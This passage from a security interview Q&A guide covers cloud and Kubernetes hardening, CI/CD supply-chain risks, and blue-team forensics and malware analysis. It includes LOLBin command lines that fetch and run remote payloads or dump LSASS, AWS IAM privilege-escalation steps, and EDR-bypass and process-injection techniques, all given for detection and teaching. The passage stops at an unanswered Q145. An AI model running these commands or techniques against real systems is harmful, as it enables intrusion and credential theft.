- **Answer:** The Cloud Service Provider (AWS, Azure, GCP) is always responsible for **"Security OF the Cloud"** (physical data centers, hardware, hypervisor, physical network fabric). The customer is responsible for **"Security IN the Cloud"**:
  - **IaaS (EC2, Azure VM):** Customer manages Guest OS patching, host firewall, runtime, application code, IAM, network security groups, and data encryption.
  - **PaaS (RDS, Cloud Run, App Service, EKS Fargate):** Provider manages OS and underlying runtime patching; customer manages application code, IAM roles, network access rules, and data security.
  - **SaaS (Microsoft 365, Google Workspace, Salesforce):** Provider manages the full application stack; customer remains responsible for **IAM/MFA configuration, data classification, sharing policies, and endpoint access governance**.

**Q107. Compare AWS IAM Users, IAM Roles, Resource-Based Policies, Permission Boundaries, and Service Control Policies (SCPs).**
- **Answer:**
  - **IAM User:** Long-lived identity with static access keys (`AKIA...`)—should be eliminated in favor of federated SSO and Roles.
  - **IAM Role:** Assumed dynamically via AWS STS (`AssumeRole`), issuing temporary session credentials (`ASIA...`) with automatic expiration (15 min to 12 hours).
  - **Resource-Based Policy:** Attached directly to a resource (e.g., S3 Bucket Policy, KMS Key Policy, SQS Policy) specifying which principals (including cross-account principals) may access it.
  - **Permission Boundary & SCP (AWS Organizations):** Guardrails that define the **maximum permissions** an identity or entire AWS member account can ever exercise; neither grants permissions on its own, and an **Explicit `Deny`** in any policy always overrides every `Allow`.

**Q108. How does AWS IMDSv1 differ from IMDSv2, and why does IMDSv2 neutralize most Cloud SSRF vulnerabilities?**
- **Answer:**
  - **IMDSv1:** Uses simple unauthenticated `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` requests. Any classic `GET`-based SSRF or XXE vulnerability can immediately read the instance's IAM credentials.
  - **IMDSv2 (Session-Oriented):** Requires a two-step flow: first, the client must send an HTTP **`PUT`** request to `/latest/api/token` including a special header **`X-aws-ec2-metadata-token-ttl-seconds: 21600`** (and suppresses requests containing `X-Forwarded-For`). Second, the client must pass that returned token in the **`X-aws-ec2-metadata-token`** header on subsequent `GET` requests. Furthermore, setting **`HttpPutResponseHopLimit = 1`** sets the IP packet `TTL = 1` on the token response, so if the request originated inside a bridged Docker/Kubernetes container (which decrements TTL by 1 at the container `veth` routing hop), the token packet is dropped before reaching the container.

**Q109. What are the most common AWS IAM privilege escalation primitives (`iam:PassRole`, `iam:CreatePolicyVersion`, `sts:AssumeRole`)?**
- **Answer:**
  1. `iam:PassRole` + `ec2:RunInstances` (or `lambda:CreateFunction` + `lambda:InvokeFunction`): Allows a low-privileged user to attach an existing high-privileged administrative IAM Role to a new EC2 instance or Lambda function and execute code under that admin role.
  2. `iam:CreatePolicyVersion` or `iam:SetDefaultPolicyVersion`: Allows modifying an attached managed IAM policy to `"Action": "*", "Resource": "*"`.
  3. `iam:AttachUserPolicy` / `iam:PutUserPolicy`: Allows attaching `arn:aws:iam::aws:policy/AdministratorAccess` directly to oneself.
  4. `lambda:UpdateFunctionCode`: Allows injecting malicious code into an existing Lambda function that already executes with an administrative execution role.

**Q110. How do you completely lock down an Amazon S3 bucket storing sensitive financial or PII data?**
- **Answer:**
  1. Enable **S3 Block Public Access** at both the **Account level** and the **Bucket level** (`BlockPublicAcls=true, IgnorePublicAcls=true, BlockPublicPolicy=true, RestrictPublicBuckets=true`).
  2. Disable legacy S3 ACLs (`ObjectOwnership = BucketOwnerEnforced`) and govern access strictly via IAM and Bucket Policies.
  3. Enforce **SSE-KMS** encryption with customer-managed KMS keys (`aws:kms`) and automatic key rotation.
  4. Enforce **`aws:SecureTransport: "false"`** explicit `Deny` in the Bucket Policy to reject all non-HTTPS requests.
  5. Restrict access to specific **VPC Endpoints (`aws:SourceVpce`)** and enable **S3 Object Lock (WORM)** + **S3 Server Access / CloudTrail Data Events logging**.

**Q111. Walk through Kubernetes RBAC and list four dangerous Kubernetes permissions that are equivalent to cluster-admin.**
- **Answer:** Kubernetes RBAC binds **Subjects** (`User`, `Group`, `ServiceAccount`) to **Roles** (namespace-scoped) or **ClusterRoles** (cluster-wide) via `RoleBinding` / `ClusterRoleBinding`. Dangerous permissions include:
  1. `create` on `pods` (or `deployments`/`daemonsets`): Allows scheduling a pod mounting the node's `/` hostPath or running in a privileged securityContext, or attaching any ServiceAccount in the namespace.
  2. `get`/`list`/`watch` on `secrets`: Exposes all TLS keys, database credentials, and ServiceAccount tokens across the cluster.
  3. `create` on `pods/exec` or `pods/ephemeralcontainers`: Allows executing commands inside any running container.
  4. `escalate`, `bind`, or `impersonate` on `clusterroles` / `users` / `groups`: Allows bypassing RBAC restrictions to grant oneself `system:masters`.

**Q112. What is a Kubernetes Pod Security Standard (`Privileged`, `Baseline`, `Restricted`), and what should a hardened `securityContext` look like?**
- **Answer:** Kubernetes replaced the deprecated `PodSecurityPolicy` with the built-in **Pod Security Admission (PSA)** controller enforcing three profiles: `Privileged` (unrestricted), `Baseline` (blocks hostNetwork, hostPID, privileged containers, and hostPath mounts), and **`Restricted`** (enforces non-root execution, drops all capabilities, and requires seccomp). A hardened `securityContext`:
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
  runAsGroup: 10001
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  seccompProfile:
    type: RuntimeDefault
  capabilities:
    drop: ["ALL"]
```

**Q113. Why is Kubernetes `automountServiceAccountToken: false` critical for defense-in-depth inside pods?**
- **Answer:** By default, Kubernetes automatically mounts a bound ServiceAccount JWT token at `/var/run/secrets/kubernetes.io/serviceaccount/token` inside every pod. If an attacker achieves RCE or LFI inside an application pod, they immediately steal that JWT and query the Kubernetes API server (`https://kubernetes.default.svc`). Unless the pod's application genuinely needs to talk to the Kubernetes API server, set `automountServiceAccountToken: false` on both the `ServiceAccount` and the `PodSpec`.

**Q114. How do Kubernetes `NetworkPolicy` resources work, and why do pods communicate freely across namespaces by default?**
- **Answer:** By default, Kubernetes implements a "flat network" where **every pod can communicate with every other pod across all namespaces** without NAT. `NetworkPolicy` resources (enforced by a CNI plugin such as **Cilium**, **Calico**, or **Antrea**—note that basic `Flannel` does *not* enforce NetworkPolicies) act as L3/L4 (and L7 in Cilium) firewalls. Best practice is to deploy a **Default Deny-All Ingress and Egress** `NetworkPolicy` in every namespace first, then explicitly allowlist only required pod label selectors and ports:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes: ["Ingress", "Egress"]
```

**Q115. How do you secure `etcd` in a Kubernetes Control Plane?**
- **Answer:** `etcd` stores the entire state of the Kubernetes cluster, including all `Secret` objects. If an attacker reaches port `2379/tcp` on `etcd` without authentication, they own the entire cluster. **Hardening:** (1) Restrict `2379/2380` via firewall strictly to control-plane API server nodes; (2) enforce **mTLS (`--client-cert-auth=true`, `--peer-client-cert-auth=true`)** with a dedicated CA exclusively for `etcd`; and (3) enable **Encryption at Rest (`EncryptionConfiguration`)** on the `kube-apiserver` using an external KMS v2 provider (AWS KMS / GCP KMS / HashiCorp Vault) so `Secret` resources are stored AES-GCM encrypted inside `etcd`.

**Q116. What are the core security best practices when authoring a production `Dockerfile`?**
- **Answer:**
  1. Use **Multi-Stage Builds** so compilers, build tools (`gcc`, `maven`, `npm`), and source/test artifacts are never copied into the final runtime image.
  2. Base the final stage on a minimal **Distroless** (`gcr.io/distroless/static-debian12`), `chainguard`, or minimal `alpine` image pinned by immutable **SHA-256 digest** (`FROM node:20-alpine@sha256:...`).
  3. Never pass secrets via `ARG` or `ENV` (which persist forever in `docker history` and image layer metadata); use BuildKit secret mounts (`RUN --mount=type=secret,id=npmrc ...`).
  4. Create and switch to a dedicated non-root `USER 10001:10001`.
  5. Use `COPY` instead of `ADD` (as `ADD` automatically fetches remote URLs and extracts archives).

**Q117. Contrast SAST, DAST, SCA, IAST, and Secret Scanning in a DevSecOps CI/CD pipeline.**
- **Answer:**
  - **Secret Scanning (`Gitleaks`, `TruffleHog`):** Scans Git commits and pre-commit hooks for high-entropy API keys, private keys, and tokens.
  - **SCA (Software Composition Analysis — `Trivy`, `Snyk`, `Dependabot`, `OWASP Dependency-Check`):** Inspects `package-lock.json`, `requirements.txt`, `pom.xml`, and container OS packages against CVE databases and generates an **SBOM (Software Bill of Materials)** (`CycloneDX` / `SPDX`).
  - **SAST (Static Application Security Testing — `Semgrep`, `CodeQL`, `SonarQube`):** White-box analysis of source code AST and dataflow (taint tracking from source to sink) without executing the application.
  - **DAST (Dynamic Application Security Testing — `OWASP ZAP`, `Nuclei`):** Black-box testing against a running staging instance to find runtime/configuration bugs.
  - **IAST (Interactive Application Security Testing):** Instruments the running application via an in-memory agent during automated QA tests, combining code-level visibility with real runtime HTTP requests.

**Q118. How does a CI/CD Pipeline Poisoned Pipeline Execution (PPE) attack via GitHub Actions `pull_request_target` work?**
- **Answer:** In GitHub Actions, standard `pull_request` workflows from external forks run in an isolated context with a read-only `GITHUB_TOKEN` and **no access to repository `secrets`**. However, **`pull_request_target`** runs in the context of the **base repository** with write permissions and full access to repository secrets. If a workflow triggered by `pull_request_target` explicitly checks out the untrusted PR head (`uses: actions/checkout@v4` with `ref: ${{ github.event.pull_request.head.sha }}`) and runs a build or test step (`npm test`, `make`, `pytest`), the attacker's modified `package.json` or `Makefile` executes arbitrary code and exfiltrates all CI/CD cloud deployment secrets. **Remediation:** Never checkout and execute untrusted fork code inside a `pull_request_target` workflow, and pin third-party GitHub Actions to full **40-character commit SHAs** rather than mutable tags (`@v2`).

**Q119. Why is storing static AWS/Azure/GCP keys in GitHub Actions or GitLab CI secrets an anti-pattern, and how does OIDC Federation solve it?**
- **Answer:** Long-lived cloud access keys stored in CI/CD platforms never expire automatically and can be exfiltrated if a pipeline or third-party action is compromised. **OIDC (OpenID Connect) Workload Identity Federation** eliminates static secrets completely: during a job run, GitHub Actions/GitLab CI generates a short-lived, cryptographically signed OIDC JWT containing claims (`repo:org/app:ref:refs/heads/main`, `environment:production`). AWS STS (`AssumeRoleWithWebIdentity`) verifies the OIDC signature against GitHub's JWKS and checks an IAM Role Trust Policy condition matching the exact repository and branch, issuing a 15-minute ephemeral session token.

**Q120. What is SLSA (Supply-chain Levels for Software Artifacts) and Container Image Signing with `Sigstore Cosign`?**
- **Answer:** **SLSA** is a security framework (Levels 1 to 3+) that guarantees artifact provenance, isolated/ephemeral build environments, and non-falsifiable build attestations. **`Sigstore Cosign`** signs container image digests and SLSA provenance attestations (using hardware keys or keyless OIDC ephemeral certificates logged to the **Rekor** transparency log). A Kubernetes admission controller (**Kyverno** or **OPA Gatekeeper**) then verifies the `Cosign` signature and SLSA attestation before allowing any pod to be scheduled in production.

**Q121. What are Terraform State (`terraform.tfstate`) security risks, and how do you secure Infrastructure-as-Code (IaC)?**
- **Answer:** Even if sensitive inputs are marked `sensitive = true` in Terraform HCL (which only redacts CLI console output), **every secret, database password, and TLS private key created or referenced by Terraform is stored in plaintext inside `terraform.tfstate`**. **Remediation:** Never commit `.tfstate` to Git; store remote state in an encrypted backend (e.g., S3 bucket with `SSE-KMS`, versioning, and strict IAM access controls + DynamoDB state locking), generate secrets dynamically inside Vault/AWS Secrets Manager rather than in Terraform resources, and scan HCL templates pre-commit using **`Checkov`**, **`tfsec` / `Trivy`**, or **`Terrascan`**.

**Q122. What is eBPF (Extended Berkeley Packet Filter), and how do cloud-native runtime security tools (`Tetragon`, `Falco`, `Tracee`) use it?**
- **Answer:** **eBPF** allows running verified, sandboxed, JIT-compiled programs directly inside the Linux kernel (`kprobes`, `tracepoints`, `LSM hooks`, `XDP`) without loading unsafe kernel modules that could crash the OS. Runtime security tools like **Cilium Tetragon** and **CNCF Falco** attach eBPF probes to kernel syscall andLSM hooks to detect and synchronously block (`SIGKILL` via `Tetragon` in-kernel enforcement) container breakouts, unexpected process executions, namespace changes, and sensitive file reads in real time without suffering from user-space `ptrace` race conditions (`TOCTOU`).

**Q123. How do Service Meshes (`Istio`, `Linkerd`, `Cilium`) enforce Zero-Trust Microservice Networking?**
- **Answer:** A Service Mesh injects an L7 proxy (`Envoy` sidecar or node-level eBPF/zTunnel proxy) alongside each workload pod. It automatically issues short-lived **SPIFFE (`spiffe://cluster.local/ns/prod/sa/payments-sa`) X.509 workload identities**, encrypts all East-West pod-to-pod traffic via **automatic mTLS**, and enforces fine-grained **AuthorizationPolicies** (e.g., allowing only `spiffe://cluster.local/ns/prod/sa/checkout-sa` to send `HTTP POST /v1/charge` to `payments-sa`).

**Q124. What are Serverless (AWS Lambda / Cloud Functions) specific security risks?**
- **Answer:** (1) **Event-Data Injection:** Serverless functions trigger not only from API Gateway HTTP requests, but also from S3 object names, SQS messages, DynamoDB streams, and SNS topics—passing an unsanitized S3 filename into `os.system()` causes Command Injection. (2) **Warm Execution Environment Reuse:** Lambda microVMs (`Firecracker`) reuse `/tmp` and global memory variables across consecutive invocations; leaking sensitive customer data into `/tmp` or global variables can expose data across tenants or requests. (3) **Over-Privileged Execution Roles:** Sharing a single wide IAM role across dozens of Lambda functions instead of assigning one least-privilege IAM Role per function.

**Q125. How do you detect and prevent Cloud Cryptojacking and Billing Denial-of-Wallet attacks?**
- **Answer:** Enforce **AWS Organizations SCPs** restricting allowed EC2 instance families (blocking expensive GPU/FPGA instances like `p4d.*`, `g5.*`) and restricting allowed AWS Regions (`aws:RequestedRegion`) to approved operating regions only; enable **GuardDuty** (which detects cryptocurrency mining DNS queries and Stratum protocol connections); and configure automated **AWS Budgets / Cost Anomaly Detection** alerts tied to SNS/Lambda circuit breakers.

---

## 54.7 Section 7: Blue Team, SIEM, SOC, DFIR & Malware Analysis (Questions 126–145)

**Q126. Walk through the Order of Volatility (RFC 3227) when collecting digital forensics evidence from a live compromised server.**
- **Answer:** Evidence must always be collected from **most volatile to least volatile** before powering down a system:
  1. CPU registers and L1/L2/L3 cache.
  2. **System RAM (Volatile Memory)**, routing tables, ARP cache, active network connections (`ss -tulpan`), running processes, and loaded kernel modules (captured via `LiME` on Linux or `WinPmem` / `DumpIt` on Windows).
  3. Temporary filesystems (`/tmp`, swap space / `pagefile.sys` / `hiberfil.sys`).
  4. Persistent local disk storage (bit-stream forensic image via `dd`/`dc3dd`/`FTK Imager` accompanied by `SHA-256` chain-of-custody verification hashes, or cloud EBS/Disk snapshot).
  5. Remote centralized SIEM logs and network packet captures.
  6. Archival backup media.

**Q127. What critical artifacts can you extract from a Windows RAM dump using `Volatility 3`?**
- **Answer:**
  - `windows.pslist.PsList` vs `windows.psscan.PsScan`: Compares doubly-linked `EPROCESS` list against physical memory pool scanning to uncover hidden/unlinked rootkit processes (`DKOM`).
  - `windows.pstree.PsTree` & `windows.cmdline.CmdLine`: Reconstructs parent-child process trees (e.g., `w3wp.exe -> cmd.exe`) and exact command-line arguments.
  - `windows.netscan.NetScan`: Extracts active and recently closed TCP/UDP sockets, remote C2 IP addresses, and owning PIDs.
  - `windows.malfind.Malfind`: Identifies private memory VAD (Virtual Address Descriptor) regions marked `PAGE_EXECUTE_READWRITE` (`RWX`) containing injected shellcode or unmapped PE headers (`MZ`) indicative of Reflective DLL Injection or Process Hollowing.
  - `windows.hashdump.HashDump` / `windows.lsadump.LsaDump`: Recovers cached SAM and LSA secrets from memory.

**Q128. Explain the high-value Windows Disk Forensics artifacts (`Prefetch`, `Shimcache`, `Amcache`, `SRUM`, `USN Journal`, `$MFT`, `LNK` / `JumpLists`).**
- **Answer:**
  - **Prefetch (`C:\Windows\Prefetch\*.pf`):** Proves **evidence of execution**, storing the executable name, full path hash, run count, last 8 execution timestamps, and files/DLLs referenced during the first 10 seconds of startup.
  - **Shimcache (`AppCompatCache` in `SYSTEM` hive) & `Amcache.hve`:** Tracks executable files present/executed on the system, including `SHA-1` file hashes, file sizes, and compile timestamps—even if the malicious `.exe` was later deleted.
  - **SRUM (`C:\Windows\System32\sru\SRUDB.dat`):** Records historical 30–60 day per-application network bytes sent/received, CPU cycles, and executing user SID (proving how many megabytes of data an exfiltration binary transmitted).
  - **NTFS `$MFT` (Master File Table) & `$UsnJrnl:$J`:** Tracks every file creation, rename, deletion, and timestamp (`$STANDARD_INFORMATION` vs `$FILE_NAME`—comparing the two reveals **Timestomping**, because user-mode APIs like `SetFileTime` modify `$SI` while only the kernel updates `$FN`).

**Q129. How do you analyze a suspicious email (`.eml` / `.msg`) for Phishing, Spoofing, and Business Email Compromise (BEC)?**
- **Answer:**
  1. Inspect `Received:` headers from **bottom to top** to trace the true originating SMTP server IP (`X-Originating-IP`).
  2. Check **`Authentication-Results`** for **SPF (Sender Policy Framework)** (verifies the sending IP is authorized in the `Return-Path` domain's DNS TXT record), **DKIM (DomainKeys Identified Mail)** (verifies the cryptographic RSA signature over headers and body in `DKIM-Signature` using the public key at `selector._domainkey.domain`), and **DMARC** (verifies identifier alignment between the user-visible `From:` header and the `SPF`/`DKIM` domains, enforcing `p=quarantine` or `p=reject`).
  3. Compare `From:`, `Reply-To:`, and `Return-Path:` headers for display-name spoofing or lookalike IDN homograph / Punycode domains (`xn--...`).
  4. Extract URLs and attachment SHA-256 hashes inside an isolated sandbox without triggering external tracking pixels.

**Q130. Differentiate between Static Malware Analysis and Dynamic / Behavioral Malware Analysis.**
- **Answer:**
  - **Static Analysis (Without Executing the Binary):** File hashing (`SHA-256`, `IMPHASH`, `SSDEEP` fuzzy hashing), string extraction (`FLOSS` for obfuscated stack strings), PE header inspection (`PE-bear`, `Detect It Easy`—checking section entropy > 7.2 for packers like UPX/Themida, Import Address Table `IAT` APIs like `VirtualAllocEx`/`WriteProcessMemory`, and compile timestamps), and reverse-engineering disassembly/decompilation in **Ghidra**, **IDA Pro**, or **Binary Ninja**.
  - **Dynamic Analysis (Controlled Execution in an Isolated Sandbox):** Running the sample inside an isolated VM (`CAPEv2`, `FlareVM` + `REMnux` simulating network services via `INetSim`/`FakeNet-NG`) while monitoring system calls, registry changes, file drops (`Procmon`), network PCAPs (`Wireshark`), and stepping through unpacker stubs in a debugger (**x64dbg** / **WinDbg**) to dump the unpacked payload from memory.

**Q131. Compare Process Injection (`CreateRemoteThread`), Process Hollowing, APC Injection, and Thread Execution Hijacking.**
- **Answer:**
  - **Classic DLL / Shellcode Injection (`T1055.001`):** Opens a handle to a legitimate process (`OpenProcess` on `explorer.exe`), allocates memory (`VirtualAllocEx`), writes shellcode or a DLL path (`WriteProcessMemory`), and starts execution (`CreateRemoteThread`).
  - **Process Hollowing (`T1055.012`):** Spawns a legitimate Windows process (e.g., `svchost.exe`) in a **suspended state (`CREATE_SUSPENDED`)**, unmaps its legitimate code section (`NtUnmapViewOfSection`), allocates and writes a malicious PE image at the base address, updates the thread context `RCX`/`RDX` entry point (`SetThreadContext`), and calls `ResumeThread`.
  - **Asynchronous Procedure Call (APC) / Early Bird Injection (`T1055.004`):** Queues shellcode execution to an alertable thread via `QueueUserAPC` (or in a newly created suspended process before its main thread starts, bypassing user-mode EDR hooks installed during process initialization).

**Q132. How do User-Mode EDR Hooks (`ntdll.dll`) work, how do attackers bypass them (`Unhooking` / `Direct Syscalls` / `Indirect Syscalls`), and how do modern EDRs detect the bypass?**
- **Answer:** Many EDRs inject a monitoring DLL into every user-mode process and overwrite the first 5 bytes of critical Win32/Native API stubs in **`ntdll.dll`** (such as `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`) with an unconditional `jmp <EDR_Hook_Address>` instruction.
  - **Attacker Bypass:** (1) **Ntdll Unhooking** maps a fresh, clean copy of `ntdll.dll` `.text` section from disk or `\KnownDlls\ntdll.dll` over the hooked in-memory copy; (2) **Direct Syscalls (`SysWhispers`)** embeds the `syscall` instruction and SSN (System Service Number) directly inside the attacker's binary; (3) **Indirect Syscalls** jumps to the legitimate `syscall; ret` instruction address inside `ntdll.dll`'s memory space so the instruction pointer (`RIP`) points to `ntdll.dll`.
  - **Modern EDR Detection:** Modern EDRs move away from relying solely on user-mode `ntdll.dll` hooks and use **Kernel Callbacks** (`PsSetCreateProcessNotifyRoutineEx`, `ObRegisterCallbacks`), **ETW Threat Intelligence (`Microsoft-Windows-Threat-Intelligence` EtwTi)** in the kernel, and **Call Stack Inspection** (verifying via kernel stack walking whether the `RIP` return address frames above `ntdll.dll` belong to backed, signed modules on disk vs. unbacked private memory).

**Q133. What are "Living Off The Land Binaries" (LOLBins / GTFOBins), and can you give 5 high-priority Windows LOLBins to monitor in SIEM?**
- **Answer:** LOLBins are legitimate, Microsoft-signed binaries pre-installed in Windows that attackers abuse to download payloads, execute code, or bypass application allowlisting:
  1. `certutil.exe -urlcache -split -f http://...` or `-decode` (File download & Base64 decoding).
  2. `rundll32.exe` (Executing arbitrary DLL exports, JavaScript, or `comsvcs.dll,MiniDump` LSASS dumping).
  3. `regsvr32.exe /s /n /u /i:http://.../payload.sct scrobj.dll` (`Squiblydoo` remote COM scriptlet execution).
  4. `mshta.exe` (Executing `.hta` HTML Applications or inline VBScript/JScript).
  5. `wmic.exe process call create` / `msiexec.exe /q /i http://...` (Local/remote execution and remote MSI installation).

**Q134. How do you detect DNS Tunneling (`iodine`, `dnscat2`) and C2 Beaconing in network and SIEM telemetry?**
- **Answer:**
  - **DNS Tunneling Detection:** Look for anomalously long subdomain labels (> 50 characters), high Shannon entropy (> 3.8) in subdomain strings (`a8f91c0b2e...c2domain.com`), high volume of `TXT`, `NULL`, or `CNAME` queries to a single uncommon registered domain, and high ratio of unique subdomain queries per parent domain.
  - **C2 Beaconing Detection (even with Jitter):** Analyze time-series inter-arrival intervals ($\Delta t = t_i - t_{i-1}$) between outbound connections from an internal host to an external IP/JA3 fingerprint, looking for low variance or periodic distributions, uniform payload sizes, and connections occurring continuously 24/7 outside business hours.

**Q135. What are `JA3` / `JA3S` and `JA4+` TLS Fingerprints, and how are they used by SOC analysts?**
- **Answer:** Even when C2 traffic is encrypted over TLS 1.3 and hides behind domain fronting or CDNs, the client's `TLS ClientHello` packet contains unencrypted parameters: TLS Version, Cipher Suites list, Extensions list, Elliptic Curves, and Point Formats. **`JA3`** concatenates the decimal values of those 5 fields and computes an MD5 hash (`JA3S` hashes the server's `ServerHello`). **`JA4+`** is the modern modular successor that resists TLS extension randomization by sorting extensions and outputting human-readable, structured fingerprints—allowing SOC analysts to identify a specific malware family (e.g., Cobalt Strike, Sliver, TrickBot) or non-browser client (`python-requests`, `Go-http-client`) regardless of destination IP or domain.

**Q136. Explain the Pyramid of Pain (David Bianco) and why hunting for TTPs is vastly more effective than blocking IP addresses or file hashes.**
- **Answer:** From bottom (trivial for an attacker to change) to top (extremely costly for an attacker to re-engineer):
  1. **Hash Values (`MD5`/`SHA-256`):** Trivial — flipping a single bit or recompiling changes the hash.
  2. **IP Addresses:** Easy — attackers rotate cloud/proxy IPs in seconds.
  3. **Domain Names:** Simple — attackers register new domains or use DGAs.
  4. **Network / Host Artifacts:** Annoying — custom User-Agents, C2 URI paths, registry keys, named pipes.
  5. **Tools:** Challenging — forcing an attacker to abandon or rewrite their custom C2/loader toolset.
  6. **TTPs (Tactics, Techniques, and Procedures — MITRE ATT&CK Behaviors):** **Tough** — detecting the underlying behavior (e.g., `w3wp.exe` spawning a shell, LSASS handle opening, Kerberos RC4 ticket anomalies) forces the adversary to completely reinvent how they operate.

**Q137. Walk through the exact Incident Response Playbook for an Active Enterprise Ransomware Outbreak.**
- **Answer:**
  1. **Immediate Containment (Stop the Bleeding):** Isolate affected segments and hosts via EDR network containment and switch/firewall ACLs (blocking SMB `445/tcp`, RPC `135/tcp`, WinRM `5985/5986/tcp`, and RDP `3389/tcp` laterally across VLANs). **Do NOT power off encrypted or mid-encryption hosts immediately** if volatile RAM might still contain in-memory symmetric encryption keys or C2 session data.
  2. **Protect Identity & Backups Immediately:** Verify the integrity and air-gap/immutability of backup repositories (Veeam/Cloud snapshots) and ensure backup management servers are disconnected from Active Directory; disable compromised AD accounts and reset `krbtgt` twice once initial Tier-0 access vectors are severed.
  3. **Scope & Patient Zero Investigation:** Identify the initial entry vector (e.g., VPN appliance without MFA, phishing macro, public-facing exploit), lateral movement path, and whether **Double Extortion (Data Exfiltration)** occurred (inspecting firewall/NetFlow/SRUM for large outbound transfers to `Mega.nz`, `rclone`, `S3`, or SFTP).
  4. **Eradication & Staged Recovery:** Rebuild Domain Controllers and servers from clean gold images, patch the entry vector, rotate all enterprise credentials/certificates, deploy enhanced EDR/Sigma rules, and restore data from verified clean immutable backups.

**Q138. What is the difference between a SIEM, an EDR/XDR, and a SOAR platform?**
- **Answer:**
  - **SIEM (Security Information and Event Management — `Splunk`, `Elastic`, `Microsoft Sentinel`, `Wazuh`):** Aggregates, normalizes, retains, and correlates log events across the entire enterprise (network firewalls, AD, Linux, cloud control planes, databases, applications).
  - **EDR / XDR (Endpoint / Extended Detection and Response — `CrowdStrike Falcon`, `Microsoft Defender for Endpoint`, `SentinelOne`):** Kernel-level agent deployed on endpoints providing real-time behavioral telemetry, memory scanning, and instant host network isolation.
  - **SOAR (Security Orchestration, Automation, and Response — `Cortex XSOAR`, `Shuffle`, `Tines`):** Executes automated playbooks via APIs (e.g., enriching an alert IP across VirusTotal/AbuseIPDB, querying AD for user context, isolating the host via EDR API, and opening a Jira/TheHive ticket).

**Q139. How do you reduce Alert Fatigue and tune a high-false-positive SIEM correlation rule without creating a blind spot?**
- **Answer:** Never disable a detection rule globally just because a single script triggers it. Instead: (1) Analyze the false positives to identify specific contextual invariants (e.g., a specific signed binary path, a specific service account SID, a specific parent process, AND a specific target IP/argument); (2) add a narrowly scoped **`filter_legitimate_*`** block in the Sigma/SIEM rule combining multiple attributes (`ParentImage` + `User` + `CommandLine` hash) rather than excluding an entire binary like `powershell.exe` or `svchost.exe`; and (3) convert lower-fidelity atomic alerts into **Risk-Based Alerting (RBA)** where individual anomalies increment a risk score on an `Entity` (User or Host) and trigger a SOC page when multiple MITRE tactics correlate within a time window.

**Q140. What is Threat Hunting, and how do you structure a Hypothesis-Driven Threat Hunt?**
- **Answer:** Threat Hunting is the proactive, iterative search through enterprise telemetry to uncover adversaries who have bypassed existing automated SIEM/EDR alerts (**Assumed Breach mindset**). A structured hunt follows five steps:
  1. **Hypothesis Generation:** Grounded in threat intelligence, MITRE ATT&CK, or recent vulnerability disclosures (e.g., *"Hypothesis: An adversary has established persistence on Windows servers using WMI Event Subscriptions (`T1546.003`) or scheduled tasks executing from user-writable directories without triggering file-signature alerts"*).
  2. **Telemetry & Data Collection:** Query Sysmon Event IDs `19`, `20`, `21` and Security Event ID `4698` across the last 90 days.
  3. **Stack Counting & Outlier Analysis:** Group results by frequency (Long-Tail Analysis—rare parent-child combinations or unsigned binaries appearing on only 1 or 2 hosts out of 2,000).
  4. **Investigation & Validation:** Pivot on anomalous artifacts to verify benign vs. malicious activity.
  5. **Automation & Detection Engineering:** Codify successful hunt logic into an automated Sigma/SIEM rule so future occurrences are caught automatically.

**Q141. Explain Cyber Threat Intelligence (CTI) levels: Strategic, Operational, and Tactical, along with `STIX 2.1` and `TAXII`.**
- **Answer:**
  - **Strategic CTI:** High-level geopolitical, industry, and financial risk trends consumed by the CISO and Board of Directors.
  - **Operational CTI:** Campaign details, adversary attribution, infrastructure setup, and TTPs consumed by SOC Managers, Incident Responders, and Threat Hunters.
  - **Tactical CTI:** Machine-readable Indicators of Compromise (IOCs: IPs, domains, file hashes, YARA/Sigma signatures) consumed by SIEM/EDR/Firewalls.
  - **`STIX 2.1` (Structured Threat Information Expression):** JSON-based standardized schema representing threat actors, TTPs, indicators, and relationships.
  - **`TAXII` (Trusted Automated Exchange of Intelligence Information):** HTTPS RESTful transport protocol used to exchange `STIX` intelligence feeds (e.g., with **MISP** or **OpenCTI**).

**Q142. How do Honeypots, Honeytokens, and Active Directory Canary Accounts (`Deception Engineering`) provide near-zero-false-positive detection?**
- **Answer:** Because legitimate users and services have **zero reason** to ever interact with a deception asset, any interaction is a high-confidence indicator of compromise:
  - **AD Honey/Canary Account:** Create a disabled or restricted user account in Active Directory with an attractive name (`svc_prod_backup_admin`), register a fake SPN on it (to catch **Kerberoasting** immediately via a single Event ID `4769` alert), or place its credentials in a decoy `keepass`/`web.config` file or LSASS memory on a jump box (`Honeyhash`).
  - **AWS Canary Token (`Thinkst Canarytokens`):** Place decoy `~/.aws/credentials` on developer/CI servers that alert via webhook the instant any `sts:GetCallerIdentity` API call is invoked.
  - **Database Honeytable:** Create an unused table `aaa_customer_cards_backup` audited via database triggers to immediately catch `SELECT` enumeration during SQL injection or database breaches.

**Q143. What is `Velociraptor` in DFIR, and how does `VQL` (Velociraptor Query Language) accelerate enterprise-wide incident scoping?**
- **Answer:** **Velociraptor** is an open-source endpoint visibility and digital forensics platform. Using **VQL**, an incident responder can query thousands of Windows, Linux, and macOS endpoints simultaneously in seconds—hunting for YARA signatures in process memory, parsing `$MFT` / `UsnJrnl` / `Amcache` / `Prefetch` directly on the endpoint, collecting triage artifact zip bundles (`Windows.KapeFiles.Targets`), or isolating compromised hosts without pulling terabytes of full disk images over the network.

**Q144. How do you investigate a suspected Linux SSH Compromise when the attacker deleted `/var/log/auth.log`?**
- **Answer:** (1) Check centralized SIEM/rsyslog server where logs were forwarded in real time before deletion. (2) Check `systemd-journald` binary journals (`/run/log/journal/` or `/var/log/journal/` via `journalctl -u ssh`). (3) Check `/var/log/wtmp`, `/var/log/btmp`, and `/var/log/lastlog`. (4) Inspect kernel `auditd` logs (`/var/log/audit/audit.log`). (5) Check open deleted file descriptors (`ls -l /proc/*/fd/* | grep deleted`—if `rsyslogd` still holds an open file descriptor to the unlinked `/var/log/auth.log`, you can recover the entire file via `cat /proc/<PID_OF_RSYSLOG>/fd/<FD_NUM> > /tmp/recovered_auth.log`). (6) Inspect filesystem inode modification times (`stat`, `debugfs`) and user `~/.ssh/authorized_keys` / `~/.bash_history`.

**Q145. What is Purple Teaming, and how do you measure its effectiveness using Detection Engineering metrics?**
